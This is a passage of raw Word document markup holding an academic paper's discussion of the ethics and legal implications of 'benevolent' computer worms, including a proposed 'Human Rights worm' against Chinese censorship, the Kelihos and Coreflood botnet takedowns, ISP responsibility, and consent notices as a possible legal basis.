          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and Alan </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Maurushat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> entitled "'</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Good</w:t>
      </w:r>
      <w:r>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Worms and Human Rights</w:t>
      </w:r>
      <w:r>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Aycock</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2006).  In their paper they discuss how China blocks free speech on the Internet through the use of firewalls and requiring filtering of content by search engines.  They argue that a “Human Rights worm” is needed that can assist users in forming a connected network that will allow the filtering to be bypassed as well as enable communication inside the country between citizens.  The worm would be self-spreading and target only IP addresses known to be inside China itself.  It would test the firewall and report back to parties other than the owner of the system it has infected.  The author’s ask the following ethical question:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRPr="00861880" w:rsidRDefault="00B42EBC" w:rsidP="00B42EBC">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="360" w:right="360"/>
        <w:mirrorIndents/>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“Who would create the worm? There is a strong psychological and political element to this question. A worm created inside China would have the distinct advantage of appearing to be change from within; a worm created outside China might seem to be external meddling, imperialism, or worse, an act of war.”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Aycock</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2006)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRPr="00861880" w:rsidRDefault="00B42EBC" w:rsidP="00B42EBC">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The dilemma that the authors argue is that the Chinese government would persecute anyone knowingly running software to allow uncensored sp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>eech in the country especially i</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>f the speech was critical of the government or its leaders.  They take the stance that a worm created outside of China and spread in a massive size unknowingly to computers within China would make it less risky for innocent Chinese citizens to be persecuted.  The authors propose several technical solutions to handle the ethical problems of what happens if inadvertent damage is caused by the worm</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> also acknowledge that unauthorized changes to another system would be illegal, but </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">they argue that “...This does not, however, automatically lead to the conclusion that a benevolent worm or virus would be unethical. Not everything ethical is legal, and not everything legal is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ethical</w:t>
      </w:r>
      <w:r w:rsidRPr="008618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Aycock</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2006).</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  This is another example of promoting what is the “greater good” ethnically for a large whole as a justification for the use of benevolent worm technology.</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Another issue is the method in which </w:t>
      </w:r>
      <w:r w:rsidR="00EB4513">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>worm spread</w:t>
      </w:r>
      <w:r w:rsidR="00EB4513">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in terms of potential damage to the machine</w:t>
      </w:r>
      <w:r w:rsidR="00EB4513">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB4513">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>it is</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> infecting.  Many worms use vulnerabilities with buffer overflows of some network service on the target system.  This causes memory to be overwritten with the potential harm of damaging user data.  In some cases the service will execute the worms code and also crash.  While most systems are configured to simply auto-restart the crashed service this can still cause temporary unavailability of the service to other users or cause </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>currently connected users to lo</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>se their session</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and data</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.  A benevolent worm could cause unwanted disruption even if it was patching the system as it might happen at an inopportune time for the users of that system.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRPr="00861880" w:rsidRDefault="00B42EBC" w:rsidP="00B42EBC">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc321736782"/>
      <w:r w:rsidRPr="00861880">
        <w:t>Legal implications of benevolent computer worms</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>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Even with efforts by large software companies such as Microsoft</w:t>
      </w:r>
      <w:r>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security softwar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">e vendors like </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kaspersky</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Lab,</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and even governments to disable worms/botnets and locate the individuals/groups responsible for them the legal aspects or risks of fully resolving the problem </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">keep </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> many away from taking further action.  In the example of the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kelihos</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> botnet takedown (Kirk 2012) the control servers were disabled, but the actual infected computers in the botnet were left alone due to worries over legal consequences </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>of</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> accessing other</w:t>
      </w:r>
      <w:r w:rsidR="00003563">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s machines without their explicit consent.  This has been a common argument against benevolent worms being allowed to attempt to patch other</w:t>
      </w:r>
      <w:r w:rsidR="00FC5A2A">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s machines (Krebs 2003).  If something were to go wrong then </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>the party responsible for releasing the worm, even with non-malicious intent, could be found responsible for at least civil damages and even possibly criminal charges.</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The biggest unprecedented move by the U.S. government was the takedown of the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Coreflood</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> botnet (Schneier 2011).  The idea </w:t>
      </w:r>
      <w:r w:rsidR="00DF4A3B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>was</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> that they would collect the IP addresses of all the infected machines by effectively taking control of the botnet and issuing a command to remove the infection.  Schneier argues that “it's the obvious solution for botnets.”  He also argues that without any clearly defined laws on this type of counterattack by government other organizations</w:t>
      </w:r>
      <w:r w:rsidR="00DF4A3B">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such as the media industry or FBI</w:t>
      </w:r>
      <w:r w:rsidR="00DF4A3B">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could also demand “disconnect” controls for those simply accused of illegal activities on the Internet.  However,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it could be possible to have an organization or entity officially responsible for releasing benevolent worms onto the Internet in order to combat a threat at a global or national level.  </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">This, however, would require careful negotiation between </w:t>
      </w:r>
      <w:r w:rsidR="00642815">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>governments</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> as well as necessary checks and balances</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to handle abuse</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  Since the few “benevolent” worms released into the wild haven’t had much peer or open public review (ex: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Nachi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>) nor any official sanction there isn’t legal precedent for this type of action.</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Placing responsibility on the ISP through legal law to disconnect users on the network with infected machines has not been popular (Pauli 2010).  Another factor in the legal aspect is who should shoulder the cost of such measures.  Smaller ISPs may simply not have the resources to police and active</w:t>
      </w:r>
      <w:r w:rsidR="0062622E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ly</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> monitor their networks for illegal activity whether done knowingly by the user or not.  In addition forcing an ISP to disconnect their own users would hurt their own business.  The general consensus is for the ISP business to govern itself without </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">government regulatory intrusion </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>as this is seen as a quicker solution and less burdensome</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Bita</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRPr="00861880" w:rsidRDefault="00B42EBC" w:rsidP="00B42E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955B9E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">For a solution to these difficult legal problems </w:t>
      </w:r>
      <w:r w:rsidRPr="0086188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would suggest</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the legal tactic of having the user grant consent to their system having the benevolent worm execute code on it.  On many websites the terms of service</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> contract</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> or privacy policy will include language that informs the person that accessing the site constitutes their content to monitoring of the IP address and pages accessed for the purpose of security or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">statistical </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>information.  Another common legal notice of consent is also found on login screens with wording similar to:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRPr="00861880" w:rsidRDefault="00B42EBC" w:rsidP="00B42EBC">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="360" w:right="360"/>
        <w:mirrorIndents/>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NOTICE TO USERS </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRDefault="00B42EBC" w:rsidP="00B42EBC">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="360" w:right="360"/>
        <w:mirrorIndents/>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Warning! The use of this system is restricted to authorized users.  All information and communications on this system are subject to review, monitoring and recording at any time, without notice or permission.  Users should have no expectation of privacy.  Unauthorized access or use shall be subject to prosecution. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRPr="00861880" w:rsidRDefault="00B42EBC" w:rsidP="00B42EBC">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:ind w:left="360" w:right="360"/>
        <w:mirrorIndents/>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(Pinal 2008).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B42EBC" w:rsidRPr="00B42EBC" w:rsidRDefault="00B42EBC" w:rsidP="00B42EBC">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">If a legal clause was placed onto a site that stated that by accessing this site the user also consented to their machine’s IP address being logged and potentially scanned against for malicious activity originating from it against the site that might give some legal headway into having a benevolent worm specifically target the end-user’s machine.  This is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>not a tested legal precedent</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> and would need serious further evaluation</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> outside the scope of this paper</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">.  In the event a site suffers a distributed denial-of-service attack, however, this </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>could</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> allow a counter-attack against possible machines being controlled by the worm/botnet.  It leaves technical difficulties if the end-users’ machines are behind a firewall of their own, but there are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">some </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">methods such as </w:t>
      </w:r>
      <w:r w:rsidR="00FB34B3">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>P2P</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">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working around </w:t>
      </w:r>
